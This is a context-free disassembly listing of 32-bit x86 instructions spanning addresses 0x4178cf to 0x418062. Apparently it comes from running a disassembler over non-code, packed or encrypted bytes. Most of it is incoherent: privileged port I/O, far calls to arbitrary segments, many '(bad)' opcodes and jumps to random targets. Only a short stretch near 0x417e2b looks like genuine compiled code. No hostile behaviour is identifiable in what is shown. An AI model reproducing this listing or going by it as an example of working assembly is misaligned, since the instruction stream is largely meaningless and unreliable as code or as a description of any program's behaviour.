  4178cf:	rol    DWORD PTR [ecx+0x788d90a6],0xea
  4178d6:	fwait
  4178d7:	dec    edx
  4178d8:	pop    es
  4178d9:	out    dx,al
  4178da:	pop    esp
  4178db:	imul   esp,ebx,0x32
  4178de:	dec    ebp
  4178df:	cld    
  4178e0:	lahf   
  4178e1:	out    dx,eax
  4178e2:	jecxz  0x4178cc
  4178e4:	lods   al,BYTE PTR ds:[esi]
  4178e5:	pop    es
  4178e6:	xor    al,BYTE PTR [ecx+0x74]
  4178e9:	aam    0x46
  4178eb:	ds enter 0x3de6,0xe
  4178f0:	iret   
  4178f1:	adc    al,0xb8
  4178f3:	sub    eax,0xa46aeab0
  4178f8:	xor    eax,0x95bb7938
  4178fd:	push   edi
  4178fe:	cld    
  4178ff:	sub    BYTE PTR [edx+0x7907f2dd],dl
  417905:	enter  0x1374,0xec
  417909:	call   0xd21f:0xe1b98c4b
  417910:	mov    ah,ch
  417912:	adc    DWORD PTR [edx+0x2c2952a8],ebx
  417918:	jge    0x417990
  41791a:	cmc    
  41791b:	mov    dh,0xe9
  41791d:	dec    edi
  41791e:	pop    ecx
  41791f:	ins    BYTE PTR es:[edi],dx
  417920:	loope  0x41796b
  417922:	shl    BYTE PTR [edi],cl
  417924:	stos   BYTE PTR es:[edi],al
  417925:	int    0x21
  417927:	push   esp
  417928:	xchg   edx,eax
  417929:	daa    
  41792a:	dec    esp
  41792b:	icebp  
  41792c:	std    
  41792d:	mov    edi,0x4dc1aad4
  417932:	jle    0x4178bc
  417934:	into   
  417935:	push   edx
  417936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417937:	dec    esi
  417938:	int3   
  417939:	(bad)  
  41793a:	xor    ebp,DWORD PTR [edi-0x1c0ba4b4]
  417940:	fs out dx,al
  417942:	pop    ds
  417943:	fild   DWORD PTR [eax+0x7efbd00b]
  417949:	test   bh,0xc7
  41794c:	xchg   ebp,eax
  41794d:	loop   0x41795a
  41794f:	cmp    dl,BYTE PTR [eax+ecx*2-0x141cc517]
  417956:	sub    al,0xad
  417958:	inc    ebx
  417959:	stc    
  41795a:	dec    ecx
  41795b:	out    dx,eax
  41795c:	aam    0x50
  41795e:	loopne 0x41799d
  417960:	int3   
  417961:	jge    0x41798f
  417963:	call   0xe32a:0xcc02c5f
  41796a:	lea    esp,[ebx]
  41796c:	enter  0x5a0e,0xb2
  417970:	mov    esi,0xf54888c1
  417975:	fwait
  417976:	out    dx,al
  417977:	pop    esi
  417978:	xor    al,0x25
  41797a:	lods   eax,DWORD PTR ds:[esi]
  41797b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797d:	aad    0x0
  41797f:	bound  eax,QWORD PTR [ebx+0x54]
  417982:	mov    eax,ds:0xe5ae5b70
  417987:	loop   0x417967
  417989:	scas   al,BYTE PTR es:[edi]
  41798a:	repz add ebp,DWORD PTR [edi+0x7256fa47]
  417991:	mov    al,0x22
  417993:	loope  0x41793d
  417995:	or     BYTE PTR [edx+0x42],al
  417998:	push   0x2986c29d
  41799d:	adc    DWORD PTR [esi-0x29],ebx
  4179a0:	dec    esi
  4179a1:	sub    eax,0x281e5929
  4179a6:	pop    ss
  4179a7:	push   ds
  4179a8:	lds    eax,FWORD PTR [ecx-0x78]
  4179ab:	sbb    cl,BYTE PTR [ebx]
  4179ad:	mov    eax,ds:0x6244a9fc
  4179b2:	js     0x41793c
  4179b4:	add    edx,DWORD PTR [edi]
  4179b6:	pop    ss
  4179b7:	pop    ebx
  4179b8:	rcl    BYTE PTR [esi],1
  4179ba:	dec    edx
  4179bb:	and    eax,0xee757a24
  4179c0:	mov    esp,esp
  4179c2:	(bad)  
  4179c3:	push   cs
  4179c4:	and    al,0x34
  4179c6:	in     eax,0x72
  4179c8:	in     al,dx
  4179c9:	xor    DWORD PTR [ebx-0x1],ecx
  4179cc:	pop    esp
  4179cd:	icebp  
  4179ce:	out    0xa2,al
  4179d0:	mov    esp,edx
  4179d2:	mov    ch,0x3b
  4179d4:	icebp  
  4179d5:	popa   
  4179d6:	scas   al,BYTE PTR es:[edi]
  4179d7:	xchg   ebx,eax
  4179d8:	(bad)  
  4179d9:	test   eax,0x91275330
  4179de:	dec    ebx
  4179df:	mov    cl,0x6c
  4179e1:	cmp    ebx,edi
  4179e3:	xchg   edx,eax
  4179e4:	xor    DWORD PTR [eax],ebp
  4179e6:	daa    
  4179e7:	(bad)  
  4179e8:	outs   dx,DWORD PTR ds:[esi]
  4179e9:	in     eax,0xe7
  4179eb:	out    dx,al
  4179ec:	inc    eax
  4179ed:	daa    
  4179ee:	jecxz  0x417a37
  4179f0:	sbb    DWORD PTR [edx-0x7ac40fbd],ebp
  4179f6:	outs   dx,BYTE PTR ds:[esi]
  4179f7:	jmp    FWORD PTR [ebp+0x3b54f101]
  4179fd:	push   ebp
  4179fe:	pop    eax
  4179ff:	mov    edx,0x76775eb2
  417a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a05:	fst    QWORD PTR [ecx]
  417a07:	fwait
  417a08:	push   ebx
  417a09:	xchg   edx,eax
  417a0a:	pushf  
  417a0b:	mov    eax,0xbf684c52
  417a10:	jle    0x417a5f
  417a12:	mov    eax,ds:0x86a3ffd0
  417a17:	sub    al,0x8a
  417a19:	push   ds
  417a1a:	fidivr WORD PTR [edi+0xf]
  417a1d:	(bad)  [eax+esi*4+0x1ef4e168]
  417a24:	xor    BYTE PTR [ebp-0x7d443424],al
  417a2a:	mov    eax,DWORD PTR [edx-0x6da1747d]
  417a30:	add    eax,0xb94c2db0
  417a35:	cmp    eax,0x39665a56
  417a3a:	cmp    eax,0x2a9bf44b
  417a3f:	jge    0x417a98
  417a41:	pop    ebp
  417a42:	(bad)  
  417a43:	popa   
  417a44:	shl    eax,cl
  417a46:	adc    ebx,DWORD PTR [ebx-0x80]
  417a49:	test   BYTE PTR [edx],0x55
  417a4c:	aas    
  417a4d:	fcomp  DWORD PTR [edi]
  417a4f:	adc    al,0x59
  417a51:	inc    ecx
  417a52:	fidiv  DWORD PTR [ebx]
  417a54:	or     eax,0x91254837
  417a59:	dec    ecx
  417a5a:	or     DWORD PTR gs:[esi-0x72e27b36],esi
  417a61:	push   cs
  417a62:	xchg   ebx,eax
  417a63:	xor    BYTE PTR [edi+0x7a067a9a],0xa0
  417a6a:	sbb    DWORD PTR [edx],ecx
  417a6c:	repz inc esp
  417a6e:	jmp    0x417a0b
  417a70:	out    dx,al
  417a71:	sbb    al,0x7b
  417a73:	in     eax,0x1b
  417a75:	cdq    
  417a76:	cmp    BYTE PTR [ecx],dh
  417a78:	mov    edx,esi
  417a7a:	nop
  417a7b:	stc    
  417a7c:	fwait
  417a7d:	sbb    esp,eax
  417a7f:	xchg   ebx,eax
  417a80:	mov    esi,0x2270fc67
  417a85:	jl     0x417acd
  417a87:	ins    DWORD PTR es:[edi],dx
  417a88:	sti    
  417a89:	jo     0x417a58
  417a8b:	rcr    BYTE PTR [ebp+0x32f84011],0xb2
  417a92:	or     al,0x3a
  417a94:	push   ss
  417a95:	mov    eax,ds:0x7437687c
  417a9a:	dec    ecx
  417a9b:	and    eax,0xb94b830a
  417aa0:	cld    
  417aa1:	es pusha 
  417aa3:	inc    eax
  417aa4:	aam    0x10
  417aa6:	clc    
  417aa7:	aad    0x8f
  417aa9:	retf   0x49f5
  417aac:	(bad)  
  417aad:	rcr    DWORD PTR [esi+ebx*4],cl
  417ab0:	mov    al,0x6d
  417ab2:	hlt    
  417ab3:	push   ds
  417ab4:	mov    eax,ds:0xcc6925a1
  417ab9:	ret    
  417aba:	cmp    DWORD PTR [ebx+0x51],0x7e4fd742
  417ac1:	sbb    eax,0xb912d38
  417ac6:	jp     0x417b26
  417ac8:	rcl    BYTE PTR [edi-0x78e99ef5],1
  417ace:	lds    edx,FWORD PTR [ecx+0x4db00b03]
  417ad4:	xchg   ecx,eax
  417ad5:	or     DWORD PTR [eax-0x18],edi
  417ad8:	cmc    
  417ad9:	bnd jl 0x417b1d
  417adc:	dec    ecx
  417add:	sbb    bl,bl
  417adf:	mov    ebp,0xcfe965b3
  417ae4:	outs   dx,DWORD PTR ds:[esi]
  417ae5:	pop    ebx
  417ae6:	add    BYTE PTR [esp+ecx*1],ah
  417ae9:	enter  0x2a67,0xfb
  417aed:	sahf   
  417aee:	nop
  417aef:	aam    0x36
  417af1:	(bad)  
  417af2:	scas   al,BYTE PTR es:[edi]
  417af3:	jae    0x417ad1
  417af5:	sbb    eax,0xc6e8e32b
  417afa:	arpl   cx,bx
  417afc:	mov    eax,ds:0xfb7b1a77
  417b01:	test   DWORD PTR [esi],0x281cea93
  417b07:	addr16 clc 
  417b09:	cld    
  417b0a:	icebp  
  417b0b:	xchg   ebp,eax
  417b0c:	cmp    esp,ebx
  417b0e:	ins    DWORD PTR es:[edi],dx
  417b0f:	and    bl,cl
  417b11:	pop    edx
  417b12:	(bad)  
  417b13:	xor    bl,dh
  417b15:	push   edx
  417b16:	mov    eax,ds:0x1678565e
  417b1b:	lock std 
  417b1d:	or     BYTE PTR [ebx-0x73f1cf66],cl
  417b23:	ins    DWORD PTR es:[edi],dx
  417b24:	pop    ds
  417b25:	xchg   edi,eax
  417b26:	addr16 out dx,al
  417b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b29:	sub    eax,0xd500be5
  417b2e:	dec    eax
  417b2f:	sub    al,0xb2
  417b31:	fcomp  st(6)
  417b33:	imul   ebx,eax,0xffffff9f
  417b36:	(bad)  
  417b37:	fstp   QWORD PTR [ebx+0x2acfc53b]
  417b3d:	in     eax,0xd8
  417b3f:	and    DWORD PTR [eax],ebp
  417b41:	outs   dx,DWORD PTR ds:[esi]
  417b42:	into   
  417b43:	das    
  417b44:	hlt    
  417b45:	xchg   ebx,esi
  417b47:	dec    esp
  417b48:	test   al,0xc2
  417b4a:	dec    edx
  417b4b:	mov    ds:0xb8d0ee54,eax
  417b50:	xor    DWORD PTR [edi],0x51e207b1
  417b56:	jle    0x417b5a
  417b58:	adc    eax,0x89fd15e
  417b5d:	inc    ecx
  417b5e:	cs test al,al
  417b61:	(bad)  
  417b62:	pusha  
  417b63:	or     BYTE PTR [eax+0x7e02224d],bl
  417b69:	rcr    al,cl
  417b6b:	ins    BYTE PTR es:[edi],dx
  417b6c:	inc    ebp
  417b6d:	sbb    ebp,esp
  417b6f:	icebp  
  417b70:	aam    0xcb
  417b72:	xchg   esp,eax
  417b73:	retf   0xffc4
  417b76:	jecxz  0x417bbf
  417b78:	and    BYTE PTR ds:0xe54cb29e,bh
  417b7e:	mov    eax,ds:0x906331f4
  417b83:	loopne 0x417b40
  417b85:	mov    DWORD PTR [edx],0x1fe642e6
  417b8b:	aaa    
  417b8c:	mov    bl,0xf5
  417b8e:	push   edi
  417b8f:	or     al,0xe5
  417b91:	xlat   BYTE PTR ds:[ebx]
  417b92:	dec    ebp
  417b93:	loop   0x417b7e
  417b95:	adc    BYTE PTR [ebx+ecx*2],cl
  417b98:	into   
  417b99:	enter  0xeefa,0xff
  417b9d:	fcom   DWORD PTR ds:0x74e31275
  417ba3:	jno    0x417b9b
  417ba5:	jge    0x417bc9
  417ba7:	addr16 cli 
  417ba9:	mov    ah,0x62
  417bab:	pusha  
  417bac:	outs   dx,BYTE PTR ds:[esi]
  417bad:	(bad)  
  417bae:	mov    bl,0x32
  417bb0:	lock gs std 
  417bb3:	pop    ecx
  417bb4:	mov    ds:0xfaa8e9e0,eax
  417bb9:	arpl   WORD PTR [esi-0x9],bp
  417bbc:	cmp    ebx,DWORD PTR [esp+eiz*2-0x150ee0a4]
  417bc3:	shl    DWORD PTR [esi+0x78],0x15
  417bc7:	ja     0x417bdd
  417bc9:	pop    edx
  417bca:	and    eax,0xa93c0f56
  417bcf:	xlat   BYTE PTR ds:[ebx]
  417bd1:	bound  esp,QWORD PTR [ebp+0x1e]
  417bd4:	cmp    BYTE PTR [esp+ecx*4+0x381d71c5],bh
  417bdb:	imul   ecx,DWORD PTR [edi],0xf617f5ec
  417be1:	adc    eax,0x465a3432
  417be6:	pop    esp
  417be7:	xchg   esi,eax
  417be8:	stos   DWORD PTR es:[edi],eax
  417be9:	popf   
  417bea:	js     0x417c13
  417bec:	sbb    eax,DWORD PTR [esi+ebp*2-0x120aee6c]
  417bf3:	pop    ecx
  417bf4:	jae    0x417c27
  417bf6:	mov    esi,ebp
  417bf8:	rcl    DWORD PTR [esi-0xb020f23],cl
  417bfe:	(bad)  
  417bff:	dec    ecx
  417c00:	or     ebp,DWORD PTR [eax+eax*4]
  417c03:	jl     0x417b85
  417c05:	jae    0x417bba
  417c07:	jmp    0x417c38
  417c09:	retf   0xfbc
  417c0c:	stc    
  417c0d:	shl    BYTE PTR [ecx],cl
  417c0f:	and    edx,edi
  417c11:	dec    esp
  417c12:	popf   
  417c13:	mov    ecx,0x8f1423d0
  417c18:	out    dx,al
  417c19:	sbb    DWORD PTR [ebx-0x56acc90e],edx
  417c1f:	ins    BYTE PTR es:[edi],dx
  417c20:	test   al,0x71
  417c22:	xlat   BYTE PTR ds:[ebx]
  417c23:	dec    esi
  417c24:	jmp    0x5a606dc
  417c29:	adc    al,0xc7
  417c2b:	popa   
  417c2c:	cwde   
  417c2d:	aam    0xb5
  417c2f:	rcl    DWORD PTR [ebp+0x21],1
  417c32:	cli    
  417c33:	add    al,BYTE PTR [ebx+esi*2+0x4d]
  417c37:	pop    ebp
  417c38:	sbb    al,0xca
  417c3a:	aad    0x2e
  417c3c:	call   0x3a95148e
  417c41:	lods   eax,DWORD PTR ds:[esi]
  417c42:	dec    eax
  417c43:	es leave 
  417c45:	dec    edx
  417c46:	addr16 mov bl,0xc2
  417c49:	push   edx
  417c4a:	cmp    BYTE PTR [esi+0x17],al
  417c4d:	cmc    
  417c4e:	inc    esp
  417c4f:	ins    DWORD PTR es:[edi],dx
  417c50:	cmp    ecx,DWORD PTR [ebp+0x4e]
  417c53:	arpl   WORD PTR [ecx+0x42d7a331],si
  417c59:	cmp    eax,DWORD PTR [ebx]
  417c5b:	pop    esi
  417c5c:	rcl    eax,cl
  417c5e:	pusha  
  417c5f:	iret   
  417c60:	cmp    DWORD PTR [ebx-0x7],esp
  417c63:	jne    0x417c26
  417c65:	mov    bl,BYTE PTR [ebp+ebp*2-0x58c20ff3]
  417c6c:	imul   edi,DWORD PTR [esi+esi*2-0x6646a7e9],0xc863bb9d
  417c77:	pop    ecx
  417c78:	dec    ebx
  417c79:	sub    DWORD PTR [ebp-0x6faa388a],edi
  417c7f:	xchg   esp,eax
  417c80:	mov    BYTE PTR [ebx-0x2636704d],bh
  417c86:	js     0x417c33
  417c88:	jae    0x417c87
  417c8a:	stc    
  417c8b:	adc    dl,BYTE PTR [ebp+0x17]
  417c8e:	ins    DWORD PTR es:[edi],dx
  417c8f:	pop    ebx
  417c90:	popf   
  417c91:	ror    cl,0x81
  417c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c95:	sbb    BYTE PTR [edx],bl
  417c97:	or     BYTE PTR [esp+edx*2-0xd],al
  417c9b:	cmp    ah,ah
  417c9d:	or     eax,0xb0b82006
  417ca2:	jmp    0x417cb2
  417ca4:	mov    al,dh
  417ca6:	or     BYTE PTR [ebp-0x78d682c0],bl
  417cac:	jge    0x417d19
  417cae:	mov    al,ds:0x8472d78c
  417cb3:	jg     0x417ca7
  417cb5:	add    cl,BYTE PTR [ebx-0x2009b324]
  417cbb:	mov    eax,0x2aa8fd53
  417cc0:	stos   DWORD PTR es:[edi],eax
  417cc1:	ins    DWORD PTR es:[edi],dx
  417cc2:	lods   al,BYTE PTR ds:[esi]
  417cc3:	out    0xd4,al
  417cc5:	ins    DWORD PTR es:[edi],dx
  417cc6:	lods   eax,DWORD PTR ds:[esi]
  417cc7:	add    dh,cl
  417cc9:	jae    0x417c56
  417ccb:	dec    esi
  417ccc:	adc    esp,esi
  417cce:	or     al,0xd9
  417cd0:	retf   0x4dcc
  417cd3:	ins    DWORD PTR es:[edi],dx
  417cd4:	call   0x6dd7600c
  417cd9:	sbb    eax,0xab75c5ee
  417cde:	and    eax,0xadccebc0
  417ce3:	pop    eax
  417ce4:	outs   dx,DWORD PTR ds:[esi]
  417ce5:	ja     0x417c92
  417ce7:	mov    bl,0xc0
  417ce9:	push   esi
  417cea:	mov    edx,DWORD PTR [ebp+0x68ccf899]
  417cf0:	inc    edi
  417cf1:	add    bh,BYTE PTR [edi-0x33421617]
  417cf7:	inc    ebx
  417cf8:	pop    ss
  417cf9:	ins    DWORD PTR es:[edi],dx
  417cfa:	cli    
  417cfb:	mov    ebp,0xa81066d8
  417d00:	adc    eax,0x1b710dee
  417d05:	pusha  
  417d06:	sahf   
  417d07:	mov    ecx,ss
  417d09:	pop    ebx
  417d0a:	cmp    DWORD PTR [esi-0x46],edi
  417d0d:	scas   al,BYTE PTR es:[edi]
  417d0e:	xlat   BYTE PTR ds:[ebx]
  417d0f:	mov    esi,0x25d7a217
  417d14:	push   ds
  417d15:	call   0x7ee5b9b
  417d1a:	xor    al,0x49
  417d1c:	sub    DWORD PTR [ebx],edx
  417d1e:	mov    ebp,0x3e286995
  417d23:	jecxz  0x417ce4
  417d25:	adc    al,0xa4
  417d27:	or     bl,BYTE PTR [edi+eax*2+0x72]
  417d2b:	fistp  DWORD PTR [edi-0x2e6bc529]
  417d31:	push   DWORD PTR [esi+0x47]
  417d34:	in     eax,0xa0
  417d36:	mov    al,ds:0x57150c7c
  417d3b:	mov    edi,0xde61cd0f
  417d40:	cmp    al,0x61
  417d42:	rol    BYTE PTR [ebx-0x641dfe42],cl
  417d48:	icebp  
  417d49:	mov    ebx,es
  417d4b:	or     eax,0x44efb98a
  417d50:	repnz (bad) 
  417d52:	xor    dl,dl
  417d54:	retf   0xb861
  417d57:	iret   
  417d58:	ds cli 
  417d5a:	pop    edi
  417d5b:	(bad)
  417d5e:	out    0xaf,eax
  417d60:	ss inc edx
  417d62:	js     0x417d54
  417d64:	out    dx,al
  417d65:	out    dx,eax
  417d66:	fstp   st(0)
  417d68:	push   eax
  417d69:	aam    0xf0
  417d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d6c:	sbb    DWORD PTR [ecx+0x44],ebp
  417d6f:	cli    
  417d70:	mov    al,ds:0x78c6e588
  417d75:	push   edx
  417d76:	dec    ebx
  417d77:	cld    
  417d78:	push   cs
  417d79:	cli    
  417d7a:	fwait
  417d7b:	dec    edx
  417d7c:	ror    ecx,cl
  417d7e:	jle    0x417dd8
  417d80:	icebp  
  417d81:	adc    DWORD PTR [ecx-0x19],edx
  417d84:	and    BYTE PTR [edx-0x19],al
  417d87:	cmp    dl,BYTE PTR [ecx+0x17]
  417d8a:	add    al,0x7e
  417d8c:	xor    esi,0xffffffb3
  417d8f:	sbb    dh,BYTE PTR [ebp+0x285017af]
  417d95:	retf   
  417d96:	pushf  
  417d97:	dec    edi
  417d98:	cmp    ebx,edx
  417d9a:	or     al,bh
  417d9c:	jg     0x417dbe
  417d9e:	(bad)  
  417d9f:	leave  
  417da0:	mov    esp,0xb5f63020
  417da5:	shr    DWORD PTR [edx+ebp*1-0xb],0xfc
  417daa:	sub    eax,0x9c3a0e5c
  417daf:	pop    ebx
  417db0:	xlat   BYTE PTR ds:[ebx]
  417db1:	scas   al,BYTE PTR es:[edi]
  417db2:	push   0x76f91de0
  417db7:	mov    ecx,0x68fca9af
  417dbc:	add    DWORD PTR [esi+0x1790a110],esp
  417dc2:	mov    bh,al
  417dc4:	or     al,0x18
  417dc6:	mov    eax,ds:0xcce0d1bd
  417dcb:	rcr    BYTE PTR [ecx+0x70d0b113],0x99
  417dd2:	sub    edx,DWORD PTR [ecx]
  417dd4:	ret    
  417dd5:	wbinvd 
  417dd7:	pop    eax
  417dd8:	mov    ds:0x7af20a9d,al
  417ddd:	inc    ebx
  417dde:	dec    edx
  417ddf:	pushf  
  417de0:	ds push cs
  417de2:	dec    ebp
  417de3:	retf   0x1f42
  417de6:	adc    BYTE PTR [ecx+0x71e21590],0x4
  417ded:	and    eax,0xf3b24708
  417df2:	je     0x417e0f
  417df4:	sbb    eax,0x861b18a8
  417df9:	fdivr  st(3),st
  417dfb:	dec    esp
  417dfc:	loope  0x417dae
  417dfe:	xchg   edi,eax
  417dff:	xchg   edx,eax
  417e00:	sti    
  417e01:	icebp  
  417e02:	scas   al,BYTE PTR es:[edi]
  417e03:	stc    
  417e04:	cdq    
  417e05:	call   0x5356:0xaa778c0f
  417e0c:	int3   
  417e0d:	adc    ebx,DWORD PTR [edx+edi*4+0x492e538d]
  417e14:	mov    ch,0x77
  417e16:	xchg   ebp,eax
  417e17:	mov    esi,0xcd5a55e3
  417e1c:	(bad)  
  417e1d:	mov    db7,esp
  417e20:	gs jns 0x417db4
  417e23:	ja     0x417de4
  417e25:	js     0x417dd7
  417e27:	xor    ebx,DWORD PTR [esi+eax*4]
  417e2a:	sahf   
  417e2b:	mov    ecx,DWORD PTR [ebp-0x20]
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fnstcw WORD PTR ds:0xdea585e0
  417e63:	cmp    BYTE PTR [ebp+0x7a],bh
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e7c
  417e6b:	push   0x3
  417e6d:	dec    eax
  417e6e:	repnz enter 0x5a52,0x2a
  417e73:	stc    
  417e74:	sti    
  417e75:	lea    edi,[esi+0x7d]
  417e78:	out    0x49,eax
  417e7a:	cmp    al,0x73
  417e7c:	sub    DWORD PTR [edx+0x2c],ecx
  417e7f:	mov    ds:0x37347e3b,al
  417e84:	add    ebp,ecx
  417e86:	and    DWORD PTR [esi-0x519c4b05],edi
  417e8c:	sbb    al,0x7f
  417e8e:	mov    ebp,0x628a4805
  417e93:	pop    edx
  417e94:	cld    
  417e95:	(bad)  
  417e97:	push   ecx
  417e98:	pop    ebp
  417e99:	mov    ds:0x4d7b6863,eax
  417e9e:	and    ebp,DWORD PTR [eax-0x3ce8105a]
  417ea4:	loop   0x417e64
  417ea6:	ret    
  417ea7:	sti    
  417ea8:	into   
  417ea9:	adc    al,0xc7
  417eab:	cmp    DWORD PTR [edi+ebx*4-0x75],edx
  417eaf:	pop    edi
  417eb0:	jb     0x417ec2
  417eb2:	cdq    
  417eb3:	inc    esp
  417eb4:	pop    esi
  417eb5:	out    0x8f,eax
  417eb7:	sbb    DWORD PTR [edi+0x44],edx
  417eba:	addr16 push cs
  417ebc:	adc    eax,0x6a4fb7b3
  417ec1:	jp     0x417eb8
  417ec3:	cmc    
  417ec4:	xor    ah,BYTE PTR [eax-0x6a770d44]
  417eca:	add    ebx,ecx
  417ecc:	std    
  417ecd:	inc    esp
  417ece:	dec    ecx
  417ecf:	stos   DWORD PTR es:[edi],eax
  417ed0:	push   ebx
  417ed1:	jne    0x417f27
  417ed3:	mov    ebx,0x73fda305
  417ed8:	test   edi,esi
  417eda:	xlat   BYTE PTR ds:[ebx]
  417edb:	(bad)
  417ede:	or     al,0x52
  417ee0:	and    esi,DWORD PTR [ebx]
  417ee2:	mov    WORD PTR fs:[ebp-0x636e52a5],gs
  417ee9:	xchg   edi,eax
  417eea:	xchg   BYTE PTR [eax-0x78ab9d9b],cl
  417ef0:	mov    ds:0x1bfab43b,eax
  417ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef6:	sub    BYTE PTR [eax+0x22],bh
  417ef9:	jns    0x417f3a
  417efb:	xlat   BYTE PTR ds:[ebx]
  417efc:	scas   eax,DWORD PTR es:[edi]
  417efd:	push   cs
  417efe:	jns    0x417e8a
  417f00:	sar    DWORD PTR [esi],cl
  417f02:	xor    ch,BYTE PTR [esi]
  417f04:	sti    
  417f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f06:	sbb    bh,ch
  417f08:	fist   WORD PTR [ebp+0x6d56628b]
  417f0e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417f10:	pop    ss
  417f11:	shl    eax,0x19
  417f14:	push   ebp
  417f15:	or     ah,al
  417f17:	xchg   ebp,eax
  417f18:	xchg   BYTE PTR [ecx+edx*2],bh
  417f1b:	cmc    
  417f1c:	stos   DWORD PTR es:[edi],eax
  417f1d:	pop    ss
  417f1e:	mov    eax,ds:0xe0c52e80
  417f23:	outs   dx,DWORD PTR ds:[esi]
  417f24:	add    al,0x9a
  417f26:	ret    
  417f27:	xor    BYTE PTR [eax-0xc379981],dh
  417f2d:	mov    dl,0x5e
  417f2f:	fidiv  DWORD PTR [eax]
  417f31:	inc    esp
  417f32:	mov    ss,ecx
  417f34:	add    bh,bl
  417f36:	adc    ecx,DWORD PTR [ebp-0x7d]
  417f39:	scas   al,BYTE PTR es:[edi]
  417f3a:	data16 fwait
  417f3c:	mov    al,0xf
  417f3e:	cmp    BYTE PTR [edi+0x1d],bh
  417f41:	iret   
  417f42:	mov    eax,ds:0x1eacff74
  417f47:	jno    0x417f64
  417f49:	xor    cl,BYTE PTR [esi]
  417f4b:	call   0x4e9839fe
  417f50:	push   ss
  417f51:	cld    
  417f52:	cmp    edi,esp
  417f54:	mov    eax,ds:0x57839bf7
  417f59:	add    BYTE PTR [edi-0x34],dl
  417f5c:	or     eax,0xd2cb048e
  417f61:	pop    eax
  417f62:	(bad)  
  417f63:	mov    WORD PTR [esi],ss
  417f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f66:	leave  
  417f67:	mov    al,ds:0x664547d0
  417f6c:	mov    ebp,ecx
  417f6e:	mov    edi,0x4f331bae
  417f73:	fnsave [ebp+0x20]
  417f76:	in     al,dx
  417f77:	lock xchg edi,eax
  417f79:	jp     0x417f00
  417f7b:	adc    dh,BYTE PTR [ebx+0x4c]
  417f7e:	mov    ecx,0x123d9b62
  417f83:	and    esi,0x38
  417f86:	int3   
  417f87:	inc    ebp
  417f88:	sti    
  417f89:	push   0xffffff8f
  417f8b:	mov    dl,BYTE PTR [edx+0x4]
  417f8e:	mov    bl,0x5b
  417f90:	mov    DWORD PTR [edi],ecx
  417f92:	stos   BYTE PTR es:[edi],al
  417f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f94:	outs   dx,BYTE PTR ds:[esi]
  417f95:	stos   DWORD PTR es:[edi],eax
  417f96:	fmul   DWORD PTR [edi]
  417f98:	stc    
  417f99:	lahf   
  417f9a:	mov    esi,DWORD PTR [ecx-0x91f945f]
  417fa0:	sub    BYTE PTR [ecx+0xb880fdc],cl
  417fa6:	out    0x26,al
  417fa8:	jmp    0xf56f5dc2
  417fad:	xor    esp,DWORD PTR [edi]
  417faf:	mov    ebp,0x65ef3887
  417fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb5:	lods   eax,DWORD PTR ds:[esi]
  417fb6:	or     al,0x45
  417fb8:	jmp    0x1bc1:0x1dbc6afd
  417fbf:	inc    esp
  417fc0:	jmp    0x418008
  417fc2:	xor    bl,BYTE PTR [edx]
  417fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fc5:	add    ecx,eax
  417fc7:	shr    BYTE PTR [ebx+0x7a02cb62],0xbd
  417fce:	add    bl,BYTE PTR [ebp-0x72be100a]
  417fd4:	and    ah,BYTE PTR [edi+0x1cc44188]
  417fda:	repnz and dl,BYTE PTR [ebx]
  417fdd:	aam    0x81
  417fdf:	mov    eax,ds:0x8b6642f9
  417fe4:	add    bh,ah
  417fe6:	push   edx
  417fe7:	stc    
  417fe8:	cwde   
  417fe9:	dec    esi
  417fea:	mov    ds:0xe6d64fb9,eax
  417fef:	and    al,0xc0
  417ff1:	mov    edx,0xdc2c16e5
  417ff6:	mov    edx,0x7497f73f
  417ffb:	mov    dl,BYTE PTR ss:[ebx+edx*4-0x680ccb0b]
  418003:	jb     0x417fab
  418005:	or     eax,DWORD PTR [ecx+0x70]
  418008:	xor    ebx,DWORD PTR [ecx+0x67c967b1]
  41800e:	push   esp
  41800f:	and    edx,ecx
  418011:	cmp    al,0x5c
  418013:	adc    al,0x8e
  418015:	add    esp,DWORD PTR [eax+edi*1-0x7e]
  418019:	iret   
  41801a:	rcl    BYTE PTR [edx],1
  41801c:	jb     0x41806a
  41801e:	pop    ebp
  41801f:	sub    dl,dh
  418021:	push   0xfaf5de8b
  418026:	inc    esi
  418027:	or     ecx,DWORD PTR [ebp-0x79b1f556]
  41802d:	push   eax
  41802e:	inc    eax
  41802f:	outs   dx,DWORD PTR ds:[esi]
  418030:	test   DWORD PTR [edx],0x9eb2dbca
  418036:	inc    esp
  418037:	out    0x2,al
  418039:	iret   
  41803a:	xchg   edi,eax
  41803b:	adc    al,0xd7
  41803d:	mov    eax,esp
  41803f:	and    eax,0x4cff92ae
  418044:	dec    ebx
  418046:	pop    ebx
  418047:	rol    BYTE PTR [ebx+eiz*2-0x22c5e889],cl
  41804e:	pop    es
  41804f:	popa   
  418050:	ds inc esp
  418052:	add    BYTE PTR [ecx],bl
  418054:	bound  ebp,QWORD PTR [ebp*4-0x21406c70]
  41805b:	rcr    cl,cl
  41805d:	mov    ds:0xa064bb33,al
  418062:	retf   0x5125
